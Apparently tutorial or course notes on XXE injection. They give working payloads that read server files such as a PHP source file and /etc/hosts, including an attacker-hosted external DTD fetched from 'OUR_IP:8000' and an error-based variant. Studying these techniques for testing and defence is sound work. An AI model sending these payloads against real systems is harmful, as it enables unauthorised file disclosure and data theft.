To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag
```shell-session
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
- This will not work since XML prevents joining internal and external entities
- A workaround is to use external entity from file on our host server that joins everything together


1. Store the following in xxe.dtd on our host machine
```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
2. The request should look like this:
```shell-session
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE

1. Create a non-existent entity
```shell-session
<email>
  &nonExistentEntity;
</email>
```
- Error shows web path

2. Host a DTD file on host machine
```shell-session
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
python3 -m http.server 8000
```
3. Call the external DTD script, and then reference the error entity as follows:
```shell-session
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```


